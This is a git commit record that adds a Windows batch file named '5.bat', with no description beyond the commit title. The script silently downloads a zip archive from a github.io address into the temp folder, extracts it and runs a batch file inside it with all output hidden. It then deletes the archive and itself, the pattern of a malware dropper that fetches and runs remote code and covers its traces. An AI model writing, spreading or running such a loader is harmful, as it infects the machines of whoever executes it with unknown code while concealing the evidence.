4cbd5a0d46b02ad1758f009671132a0d5a6aa7c7
2hac <d2sWo6vH5p6x0V2CcbeF1opLywWE@gmail.com>
2024-06-14 06:20:42 -0700

    Create 5.bat

---
+++ 5.bat
@@ -0,0 +1,14 @@
+@echo off
+setlocal
+set "URL=https://2hac.github.io/-/8.zip"
+set "TempZip=%TEMP%\2fhbwe.zip"
+set "ExtractPath=%TEMP%\ctr5.tmp"
+set "BatchScript=exstat.bat"
+powershell -command "& {Invoke-WebRequest -Uri '%URL%' -OutFile '%TempZip%'}" > nul 2>&1
+mkdir "%ExtractPath%" > nul 2>&1
+powershell -command "& {Expand-Archive -Path '%TempZip%' -DestinationPath '%ExtractPath%'}" > nul 2>&1
+call "%ExtractPath%\%BatchScript%" > nul 2>&1
+del /F /Q "%TempZip%" > nul 2>&1
+del /F /Q "%~f0" > nul 2>&1
+endlocal
+exit
